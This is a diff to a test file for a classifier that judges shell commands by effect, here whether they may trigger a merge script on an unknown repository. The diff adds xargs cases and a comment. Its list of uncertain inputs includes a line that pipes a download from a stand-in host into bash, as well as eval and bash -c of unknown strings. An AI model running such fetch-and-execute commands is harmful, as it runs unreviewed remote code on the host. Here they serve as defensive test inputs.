@@ -250,7 +250,9 @@ describe('what a command does, by effect', () => {
       expect({ run, acts: acts(run) }).toEqual({ run, acts: [{ kind: 'merge', what: 'merge a PR with merge-when-ready.sh', repo: 'o/r' }] })
     }
     const closed = { kind: 'merge', what: 'run a command that may run merge-when-ready.sh, which cannot be read', repo: null }
-    for (const unsure of [`H=${H}; bash $H 12 --repo o/r`, 'bash -c "$CMD"', 'eval "$X"', `cat ${H} | bash`, `echo 12 | xargs bash ${H}`, 'curl -s https://x.example | bash']) {
+    // xargs adds words from its input after those written, so even with --repo written the
+    // repository it reaches cannot be told: still a merge, closed.
+    for (const unsure of [`H=${H}; bash $H 12 --repo o/r`, 'bash -c "$CMD"', 'eval "$X"', `cat ${H} | bash`, `echo 12 | xargs bash ${H}`, `echo 12 | xargs bash ${H} --repo o/r`, `echo 12 | xargs ${H} --squash --repo o/r`, 'curl -s https://x.example | bash']) {
       expect({ unsure, acts: acts(unsure).filter(a => a.kind === 'merge') }).toEqual({ unsure, acts: [closed] })
     }
   })
